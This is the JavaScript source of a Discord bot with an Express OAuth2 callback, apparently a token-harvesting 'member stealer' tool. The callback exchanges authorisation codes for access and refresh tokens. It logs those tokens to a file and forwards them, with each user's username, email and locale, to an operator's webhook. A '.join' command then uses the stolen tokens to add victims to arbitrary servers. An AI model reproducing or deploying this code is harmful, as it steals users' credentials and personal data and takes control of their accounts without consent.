require('dotenv').config();
const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const axios = require('axios');
const url = require('url');
const fs = require('fs/promises');

const port = process.env.PORT || portyaz;
const app = express();
const prefix = '.';
const berkid = [''];

const client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.MessageContent,
    ],
  });

const webhook = '';
const userlog = 'users.txt';

let berksayac = 0;

app.get('/api/auth/discord/redirect', async (req, res) => {
    const { code } = req.query;

    if (code) {
        const formData = new url.URLSearchParams({
            client_id: process.env.ClientID,
            client_secret: process.env.ClientSecret,
            grant_type: 'authorization_code',
            code: code.toString(),
            redirect_uri: '',
        });

        try {
            const output = await axios.post('https://discord.com/api/v10/oauth2/token',
                formData, {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                });

            if (output.data) {
                const access = output.data.access_token;

                const userinfo = await axios.get('https://discord.com/api/v10/users/@me', {
                    headers: {
                        'Authorization': `Bearer ${access}`,
                    },
                });

                const userId = userinfo.data.id;

                berksayac++;
                const userData = `Access Token: ${access}, User ID: ${userId}\n`;
                await fs.appendFile(userlog, userData);

                const webhookData = {
                    content: `**Kullanıcı Adı:** ${userinfo.data.username}\n**ID:** ${userId}\n**E-posta:** ${userinfo.data.email}\n**Ülke:** :flag_${userinfo.data.locale}:\n**Access Token:** ${output.data.access_token}\n**Refresh Token:** ${output.data.refresh_token}`,
                    embeds: [
                        {
                            thumbnail: {
                                url: `https://cdn.discordapp.com/avatars/${userId}/${userinfo.data.avatar}.png`,
                            },
                            footer: {
                                text: `Kullanıcı Sayısı: ${berksayac}`,
                              },
                        },
                    ],
                };

                await axios.post(webhook, webhookData)
                    .then(response => {
                        console.log('Webhook Gönderildi.', response.data);
                    })
                    .catch(error => {
                        console.error('Webhook Hatası:', error.message);
                    });
            }
        } catch (error) {
            console.error('Webhook Hatası:', error.message);
        }
    }
});

const joinCommand = async (guild, count) => {
    try {
        const data = await fs.readFile(userlog, 'utf-8');
        const lines = data.trim().split('\n');

        const usersToAdd = Math.min(count, lines.length);

        for (let i = 0; i < usersToAdd; i++) {
            const [, userAccessToken, userId] = lines[i].match(/Access Token: (.+), User ID: (.+)/);

            const url = `https://discord.com/api/v10/guilds/${guild.id}/members/${userId}`;
            const headers = {
                'Content-Type': 'application/json',
                'Authorization': `Bot ${process.env.token}`,
            };

            const data = {
                access_token: userAccessToken,
            };

            await new Promise(resolve => setTimeout(resolve, 500));

            try {
                await axios.put(url, data, { headers });
                console.log(`Kullanıcı (${userId}) sunucuya başarıyla eklendi.`);
            } catch (error) {
                console.error(`Kullanıcı (${userId}) sunucuya eklenirken hata oluştu:`, error.message);
            }
        }

        console.log(`${usersToAdd} kullanıcılar sunucuya eklendi.`);
    } catch (error) {
        console.error('users.txt yok:', error.message);
    }
};
  
client.on('messageCreate', async message => {
    if (!message.content.startsWith(prefix) || message.author.bot) return;
  
    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
  
    if (command === 'join') {
        if (!berkid.includes(message.author.id)) {
            return message.reply('Bu komutu kullanmaya yetkiniz yok.');
        }

        const countToAdd = parseInt(args[0]);
        if (isNaN(countToAdd) || countToAdd <= 0) {
            return message.reply('Lütfen geçerli bir sayı girin.');
        }

        joinCommand(message.guild, countToAdd);
        message.reply(`${countToAdd} kullanıcı başarıyla sunucuya eklendi!`);
    } else if (command === 'user') {
        if (!berkid.includes(message.author.id)) {
            return message.reply('Bu komutu kullanmaya yetkiniz yok.');
        }

        message.channel.send(`Kullanıcı Sayısı: ${berksayac}`);
    }
});

app.listen(port, () => {
    console.log(`Port Hazır: ${port}`);
});

client.login(process.env.token);